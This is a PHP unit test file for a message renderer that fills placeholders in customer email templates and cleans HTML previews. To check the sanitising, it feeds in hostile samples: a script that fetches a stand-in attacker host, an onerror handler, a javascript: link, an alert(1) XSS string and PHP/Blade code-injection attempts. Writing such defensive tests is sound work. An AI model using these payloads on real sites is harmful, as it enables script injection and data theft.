<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Domain\Templates\MessageRenderer;
use App\Domain\Templates\Template;
use Tests\TestCase;

/**
 * Message rendering.
 *
 * Unit tests rather than feature ones, because the properties that matter here are
 * about strings: what a body becomes, and what it never becomes. They are the
 * reason a customer's template is content and not code, so they are tested
 * directly rather than through a page that happens to call this.
 */
class MessageRendererTest extends TestCase
{
    public function test_a_supported_placeholder_is_replaced_with_the_supplied_value(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            'Hello Ada,',
            $renderer->substitute('Hello {{first_name}},', ['first_name' => 'Ada']),
        );
    }

    public function test_a_placeholder_written_with_spaces_is_still_a_placeholder(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            'Ada <ada@example.com>',
            $renderer->substitute('{{ first_name }} <{{email}}>', [
                'first_name' => 'Ada',
                'email' => 'ada@example.com',
            ], false),
        );
    }

    /**
     * The single most important property in this class.
     */
    public function test_an_unknown_placeholder_is_left_exactly_as_the_customer_wrote_it(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            'Hello {{frist_name}},',
            $renderer->substitute('Hello {{frist_name}},', ['first_name' => 'Ada']),
        );
    }

    public function test_a_placeholder_with_no_value_is_left_visible(): void
    {
        $renderer = new MessageRenderer;

        // A preview with the placeholders blanked out would hide the very mistake
        // this renderer exists to make visible.
        $this->assertSame(
            'Hello {{first_name}},',
            $renderer->substitute('Hello {{first_name}},', []),
        );
    }

    public function test_values_are_escaped_when_substituted_into_html(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            'Hello &lt;script&gt;alert(1)&lt;/script&gt;,',
            $renderer->substitute('Hello {{first_name}},', [
                'first_name' => '<script>alert(1)</script>',
            ]),
        );
    }

    public function test_values_are_not_escaped_when_substituted_into_plain_text(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            'Ada & you',
            $renderer->substitute('{{first_name}}', ['first_name' => 'Ada & you'], false),
        );
    }

    public function test_php_and_blade_are_not_placeholders_and_are_not_replaced(): void
    {
        $renderer = new MessageRenderer;

        foreach ([
            '{{$name}}',
            '{!! $html !!}',
            '<?php echo $name; ?>',
            '@if ($x) yes @endif',
        ] as $attempt) {
            $this->assertSame(
                $attempt,
                $renderer->substitute($attempt, ['name' => 'Ada', 'html' => 'x', 'x' => 'y']),
            );
        }
    }

    public function test_unknown_placeholders_are_reported_by_name(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            ['frist_name', 'company'],
            $renderer->unknownTokens('{{frist_name}} {{company}} {{email}} {{frist_name}}'),
        );
    }

    public function test_the_placeholders_a_body_uses_are_reported(): void
    {
        $renderer = new MessageRenderer;

        $this->assertSame(
            ['email', 'unsubscribe_url'],
            array_map(
                static fn ($token): string => $token->value,
                $renderer->tokensUsed('To {{email}} — {{unsubscribe_url}} — {{email}}'),
            ),
        );
    }

    public function test_a_script_is_removed_before_a_body_is_previewed(): void
    {
        $renderer = new MessageRenderer;

        $preview = $renderer->forPreview(
            '<p>Hello</p><script>fetch("https://attacker.example/beacon")</script><p>Bye</p>'
        );

        $this->assertStringNotContainsString('<script', $preview);
        $this->assertStringNotContainsString('attacker.example', $preview);
        $this->assertStringContainsString('<p>Hello</p>', $preview);
        $this->assertStringContainsString('<p>Bye</p>', $preview);
    }

    public function test_an_inline_event_handler_is_removed_before_a_body_is_previewed(): void
    {
        $renderer = new MessageRenderer;

        $this->assertStringNotContainsString(
            'onerror',
            $renderer->forPreview('<img src="x" onerror="steal()">'),
        );
    }

    public function test_a_javascript_url_is_removed_before_a_body_is_previewed(): void
    {
        $renderer = new MessageRenderer;

        $this->assertStringNotContainsString(
            'javascript:',
            $renderer->forPreview('<a href="javascript:steal()">click</a>'),
        );
    }

    public function test_an_attempt_to_run_code_is_recognised(): void
    {
        $renderer = new MessageRenderer;

        foreach (['<?php echo 1; ?>', '{!! $body !!}', '@php $x = 1; @endphp', '@include("x")'] as $attempt) {
            $this->assertTrue(
                $renderer->containsExecutableSyntax($attempt),
                'failed to recognise '.$attempt,
            );
        }

        $this->assertFalse($renderer->containsExecutableSyntax('Hello {{first_name}}.'));
    }
}
